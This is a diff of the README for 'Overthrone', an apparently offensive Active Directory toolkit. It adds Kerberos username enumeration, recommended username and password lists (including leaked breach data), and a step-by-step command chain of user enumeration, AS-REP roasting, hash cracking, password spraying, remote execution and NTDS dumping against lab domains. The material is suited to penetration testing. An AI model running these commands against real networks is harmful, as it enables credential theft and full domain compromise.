@@ -37,6 +37,7 @@
 <p align="center">
   <a href="#what-is-this"><b>What is this</b></a> &nbsp;·&nbsp;
   <a href="#installation"><b>Install</b></a> &nbsp;·&nbsp;
+  <a href="#wordlists"><b>Wordlists</b></a> &nbsp;·&nbsp;
   <a href="#commands"><b>Commands</b></a> &nbsp;·&nbsp;
   <a href="#usage"><b>Autopwn Usage</b></a> &nbsp;·&nbsp;
   <a href="#architecture"><b>Architecture</b></a> &nbsp;·&nbsp;
@@ -127,7 +128,7 @@ Here's what's inside the box. Every module. Every protocol. Every hilarious amou
 |---|---|---|---|
 | `overthrone-core` | The Absolute Unit | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry, PKINIT), attack graph with Dijkstra pathfinding, port scanner, full ADCS exploitation (ESC1-ESC8), crypto primitives (AES-CTS, RC4, HMAC, MD4, DPAPI, ticket crypto, GPP decryption), C2 integration (Sliver, Havoc, Cobalt Strike), plugin system (native DLL + WASM via wasmtime), remote execution (PsExec, SmbExec, WmiExec, WinRM, AtExec), interactive shell abstraction, secretsdump, RID cycling | The absolute unit that ate the gym. Every protocol is real - 56KB of Kerberos, 56KB of SMB, 43KB of LDAP, 50KB of secretsdump. The crypto has been battle-hardened with 66 passing tests. All 8 ADCS ESC vectors are fully implemented. 222 unit tests. Zero clippy warnings. The borrow checker needed therapy after this one. |
 | `overthrone-reaper` | The Collector | AD enumeration - users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS (v1 plaintext + v2 encrypted via DPAPI), GPP password decryption, MSSQL instances, ADCS template enumeration, BloodHound JSON export, CSV export | BloodHound's data collection arc but without Neo4j eating 4GB of RAM for breakfast. LAPS v2 encrypted now actually decrypts thanks to the DPAPI module finally existing. The long-awaited reunion happened. There were tears. |
-| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism | The crate that did all its homework, extra credit, and the teacher's homework too. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class and then helped the other crates pass their finals. |
+| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, **zero-knowledge username enumeration via Kerberos AS-REQ**, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism | The crate that did all its homework, extra credit, and the teacher's homework too. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class and then helped the other crates pass their finals. |
 | `overthrone-crawler` | The Explorer | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, **foreign trust LDAP enumeration** (users, groups, computers, SPNs, ACLs across trust boundaries), cross-domain escalation planning | Used to have 5 functions that all returned empty with "LDAP not yet implemented." Now `foreign.rs` is 25KB of real cross-trust LDAP queries. The procrastination era is over. Welcome to the productivity arc. |
 | `overthrone-forge` | The Blacksmith | Golden/Silver/Diamond ticket forging with full PAC construction, DCSync per-user extraction via MS-DRSR, Shadow Credentials (msDS-KeyCredentialLink + PKINIT auth), ACL backdoors via DACL modification, Skeleton Key orchestration via SMB/SVCCTL, DSRM backdoor via remote registry, forensic cleanup for all persistence mechanisms, ticket validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Actually works now - PKINIT has real RSA signing and DH key exchange instead of "placeholder PEM structures." The chocolate key became a real key. |
 | `overthrone-pilot` | The Strategist | Autonomous attack planning from graph data, step-by-step execution with rollback, adaptive strategy based on runtime results, **Q-Learning reinforcement learning engine** (compiled by default), goal-based planning ("get DA" → resolve path), YAML playbook engine, interactive wizard mode, full autopwn orchestration connecting enum → graph → exploit → persist → report, **live kill-chain pipeline visualization**, per-step Q-state/decision/reward readout, 9-section final report with credential tables and loot summaries | The "hold my beer" engine. Now with Q-Learning AI that learns which attacks work best against different environments, and actually tells you what it's doing instead of running in mysterious silence. Every step prints its stage, noise level, priority, and result. The Q-learner shows its state, which action it picked, whether it's exploring or exploiting, and the reward it got. The final report has a kill-chain completion visual, per-stage stats, credential tables, admin host lists, loot summaries, and a full audit trail. It plans, it adapts, it executes, it explains itself, it cleans up. If this crate were a person, it would be the one friend who handles your vacation AND writes a detailed trip report with expense breakdowns. |
@@ -249,6 +250,7 @@ ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS           # Full AI killchain
 ovt auto-pwn --config ./eng.toml --resume session.json  # Resume with config
 ovt wizard   -t DA --dc-host DC -d DOMAIN -u USER      # Guided mode
 ovt enum all -H DC -d DOMAIN -u USER -p PASS            # Enumerate everything
+ovt kerberos user-enum -H DC -d DOMAIN --userlist users.txt   # Zero-knowledge user enum
 ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS      # Kerberoast
 ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN       # Remote exec
 ovt dump -t DC ntds -d DOMAIN -u DA -p PASS -o json     # Dump NTDS as JSON
@@ -288,6 +290,7 @@ The crate with zero stubs. The only crate that did all its homework. If overthro
 |---|---|---|
 | **Kerberoasting** | Request TGS tickets for SPN accounts, crack offline with embedded wordlist or hashcat. The DC hands you encrypted tickets and says "good luck cracking these" and hashcat says "lol." | ✅ Full |
 | **AS-REP Roasting** | Request AS-REP for accounts without pre-auth. Someone unchecked "Do not require Kerberos preauthentication." That single checkbox has caused more breaches than we can count. | ✅ Full |
+| **Kerberos User Enumeration** | Zero-knowledge username discovery via AS-REQ probes. No credentials needed — the KDC error code reveals whether each account exists (`KDC_ERR_C_PRINCIPAL_UNKNOWN` = not found, `KDC_ERR_PREAUTH_REQUIRED` = valid). Automatically captures AS-REP hashes for any no-preauth accounts found during enumeration. Bring your own wordlist (SecLists, etc). | ✅ Full |
 | **Auth Coercion** | PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce - force machines to authenticate to you. The DC does this willingly. Microsoft considers this "working as intended." | ✅ Full (5 techniques) |
 | **RBCD Abuse** | Create machine account + modify msDS-AllowedToActOnBehalfOfOtherIdentity + S4U2Self/S4U2Proxy chain. The attack with the longest name and the shortest time-to-DA. | ✅ Full |
 | **Constrained Delegation** | S4U2Self + S4U2Proxy to impersonate users to specific services. Microsoft: "You can only impersonate to these services." Attackers: "What about these other services?" | ✅ Full |
@@ -572,6 +575,81 @@ brew install samba
 | **macOS** | Full support | Kerberos and LDAP work natively. `brew install samba` for SMB. Tim Cook would not approve. |
 | **WSL** | Full support | Best of both worlds - Windows target, Linux attacker, one machine. |
 
+---
+
+## Wordlists
+
+Overthrone does **not** bundle wordlists — bring your own. Every `--userlist` and `--wordlist` flag accepts any path on your system.
+
+### Recommended: SecLists
+
+```bash
+# Kali (already installed)
+ls /usr/share/seclists/
+
+# Install on any Debian/Ubuntu system
+sudo apt install seclists
+
+# Or clone directly
+git clone --depth=1 https://github.com/danielmiessler/SecLists.git ~/seclists
+```
+
+### Username Lists
+
+```bash
+# Zero-knowledge user enumeration — massive list, slow but thorough
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Faster: statistically likely first.last / f.last / flast formats
+/usr/share/seclists/Usernames/Names/names.txt
+/usr/share/seclists/Usernames/statistically-likely-usernames/john.smith.txt
+/usr/share/seclists/Usernames/statistically-likely-usernames/jsmith.txt
+
+# AD service account patterns
+/usr/share/seclists/Usernames/Names/names.txt
+```
+
+### Password Lists
+
+```bash
+# Top 1000 — use for spraying (fast, stays under lockout threshold)
+/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+
+# Seasonal passwords — highest hit rate in enterprise AD
+/usr/share/seclists/Passwords/Seasonal/
+
+# RockYou — offline cracking of captured hashes
+/usr/share/wordlists/rockyou.txt
+
+# Leaked AD passwords (actual corporate breach data)
+/usr/share/seclists/Passwords/Leaked-Databases/
+```
+
+### Zero-Knowledge Kill Chain Example
+
+```bash
+# 1. Enumerate valid usernames — no credentials needed
+ovt kerberos user-enum -H 192.168.57.11 -d north.sevenkingdoms.local \
+  --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  --output ./loot/valid_users.txt \
+  --delay 100
+
+# 2. AS-REP roast the valid list (any no-preauth accounts get auto-captured during step 1)
+ovt kerberos asrep-roast -H 192.168.57.11 -d north.sevenkingdoms.local \
+  -U ./loot/valid_users.txt
+
+# 3. Crack captured hashes
+ovt crack --file ./loot/asrep_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
+
+# 4. Spray valid users with most likely AD passwords
+ovt spray -H 192.168.57.11 -d north.sevenkingdoms.local \
+  --userlist ./loot/valid_users.txt \
+  --wordlist /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
+  --delay 1000 --jitter 500
+```
+
+---
+
 ## Usage
 
 ### Quick Start - Autopwn
@@ -626,13 +704,28 @@ ovt graph stats                                           # node/edge counts
 ovt graph export --output graph.json                     # save it
 ovt graph export --output bloodhound.json --bloodhound   # BloodHound format
 
-# Step 3: Kerberoast + AS-REP
+# Step 3 (zero-knowledge): Enumerate valid usernames — no creds needed
+# Uses Kerberos error codes to determine if each username exists.
+# Bring your own wordlist — see the Wordlists section below.
+ovt kerberos user-enum -H 10.10.10.1 -d corp.local \
+  --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  --output ./loot/valid_users.txt \
+  --delay 100
+
+# Also works with any other list
+ovt kerberos user-enum -H 10.10.10.1 -d corp.local \
+  --userlist /usr/share/seclists/Usernames/Names/names.txt
+
+# Step 4: Kerberoast + AS-REP against discovered users
 ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
-ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
+ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -U ./loot/valid_users.txt -p 'Summer2026!'
 ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough
 
-# Step 4: Spray (respect the lockout policy)
-ovt spray -H 10.10.10.1 -d corp.local --password 'Winter2026!' --userlist users.txt
+# Note: any no-preauth accounts found during user-enum automatically save
+# their AS-REP hashes to ./loot/userenum_asrep_hashes.txt — free hashes.
+
+# Step 5: Spray (respect the lockout policy)
+ovt spray -H 10.10.10.1 -d corp.local --password 'Winter2026!' --userlist ./loot/valid_users.txt
 
 # Step 5: Lateral movement
 ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'
